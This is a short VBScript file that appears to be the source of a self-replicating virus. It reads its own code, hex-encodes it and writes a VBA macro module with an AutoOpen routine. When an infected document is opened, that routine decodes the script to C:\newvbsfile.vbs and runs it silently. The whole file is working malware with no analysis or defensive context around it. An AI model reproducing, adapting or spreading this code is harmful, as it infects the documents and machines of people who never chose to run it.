On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set fl=fso.OpenTextFile(WScript.ScriptFullname,1)
virus=fl.ReadAll
fl.Close

set sp=fso.CreateTextFile("example_vbshex.txt",True,8)
sp.WriteLine "Attribute VB_Name = ""VirModule"""
sp.WriteLine "Sub AutoOpen()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "e = """""

For i=1 To len(virus)

e=Mid(virus,i,1)
e=Hex(Asc(e))

If Len(e)=1 Then
e="0"&e
End If

f=f+e
If Len(f)=110 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

If Len(virus)-i = 0 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

Next

sp.WriteLine "read=dec(e)"
sp.WriteLine "Open ""C:\newvbsfile.vbs"" For Output As #1"
sp.WriteLine "Print #1, read"
sp.WriteLine "Close #1"
sp.WriteLine "Shell ""wscript C:\newvbsfile.vbs"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Function dec(octe)"
sp.WriteLine "For hexad = 1 To Len(octe) Step 2"
sp.WriteLine "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))"
sp.WriteLine "Next"
sp.WriteLine "End Function"
sp.Close
